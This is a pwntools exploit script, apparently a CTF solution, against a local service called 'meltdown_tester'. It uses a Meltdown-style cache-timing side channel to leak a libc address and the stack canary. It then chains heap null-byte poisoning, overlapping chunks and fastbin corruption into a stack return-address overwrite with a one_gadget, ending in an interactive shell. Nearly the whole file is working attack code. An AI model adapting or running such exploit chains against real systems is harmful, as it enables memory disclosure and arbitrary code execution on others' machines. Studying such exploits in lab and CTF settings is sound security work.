from pwn import *

success_base = 310

def make_sample(size, data):
	print p.recv()
	p.sendline("1")
	print p.recv()
	p.sendline(str(size))
	print p.recv()
	p.send(data)

def edit_sample(idx, data):
	print p.recv()
	p.sendline("2")
	print p.recv()
	p.sendline(str(idx))
	print p.recv()
	p.send(data)

def delete_sample(idx):
	print p.recv()
	p.sendline("3")
	print p.recv()
	p.sendline(str(idx))

def specu(addr):
	print p.recv()
	p.sendline("4")
	p.sendline(hex(addr))

def clflush():
	print p.recv()
	p.sendline("5")

def rdtsc(mapping):
	print p.recv()
	p.sendline("6")
	p.sendline(hex(mapping))
	p.recvuntil("access time : ")
	return int(p.recvline()[:-1])

def leak(addr):
	while True:
		min_time = 9999
		for i in range(256):
        		target_map = mapping + i * 4096
        		clflush()
        		specu(addr)
        		access_time = rdtsc(target_map)
        		if access_time < min_time:
        		        min_time = access_time
        		        best_val = i
			print("running : %d" % access_time)
		# successful to leak
		if (min_time < success_base):
			break
		print("min time : %d" % min_time)
	print("found : %x(%d)" % (best_val, min_time))
	return best_val


libc_name = "./libc-2.23.so"
libc = ELF(libc_name)
target_name = "./meltdown_tester"
target = ELF(target_name)

#p = process(target_name)
p = remote("0", 1818)
p.recvuntil("0x")
stack_addr = int(p.recvline()[:-1], 16)
p.recvuntil("mapping is at 0x")
mapping = int(p.recvline()[:-1], 16)
log.info("stack   : 0x%x" % stack_addr)
log.info("mapping : 0x%x" % mapping)

# leak libc base
to_leak = target.got['printf']
addr = ("%c%c%c%c%c%c" % (leak(to_leak),leak(to_leak+1),leak(to_leak+2),leak(to_leak+3),leak(to_leak+4),leak(to_leak+5))).ljust(8, "\x00")
printf_addr = u64(addr)
libc_base = printf_addr - (0x7ffff7a62800 - 0x7ffff7a0d000)
log.info("printf addr : 0x%x" % printf_addr)
log.info("libc base   : 0x%x" % libc_base)

libc_base = 0x7ffff7a0d000

# leak canary
to_leak = stack_addr + 57
addr = ("%c%c%c%c%c%c%c" % (leak(to_leak),leak(to_leak+1),leak(to_leak+2),leak(to_leak+3),leak(to_leak+4),leak(to_leak+5),leak(to_leak+6))).rjust(8, "\x00")
canary = u64(addr)
log.info("canary   : 0x%x" % canary)
raw_input()

make_sample(0x198, "0"*0x198) 	# idx 0
make_sample(0x200, "1"*0x200) 	# idx 1
make_sample(0x200, "2"*0x200) 	# idx 2

fake_chunk = "1" * (0x200-16)
fake_chunk += p64(0x200)	# fake prev_size
fake_chunk += p64(0)
edit_sample(1, fake_chunk)

delete_sample(1)		# free idx1
edit_sample(0, "0"*0x198)	# null byte poisoning
p.send("\n")

make_sample(0xc0, "3"*0xc0)	# idx 3 in idx 1
make_sample(0xc0, "4"*0xc0)	# idx 4 in idx 1

delete_sample(3)
delete_sample(2)		# merge idx 1 and idx 2

make_sample(0xc8, "5" * 0xc0 + "\x00"*8)# idx 5 in idx 3
make_sample(0x60, "6" * 0x60 + "\n")	# idx 6 on idx 4 (overlay)
make_sample(0x60, "7\n")		# dummy
make_sample(0x60, "8\n")		# dummy
make_sample(0x60, "9\n")		# dummy

delete_sample(8)
delete_sample(6)

fake_chunk = p64(0)*5 + p64(0x70)
print p.recv()
p.sendline(fake_chunk)

# control the fastbin
fake_addr = stack_addr + 32
print "%x" % fake_addr
edit_sample(4, p64(fake_addr) + "\n")
make_sample(0x60, "10\n")

# overwrite
one_gadget = libc_base + 0xf1147
payload = "a"*8 + p64(canary) + "b"*8 + p64(one_gadget)
make_sample(0x60, payload + "\n")

log.info("stack   : 0x%x" % stack_addr)
log.info("mapping : 0x%x" % mapping)
log.info("canary   : 0x%x" % canary)
p.interactive()
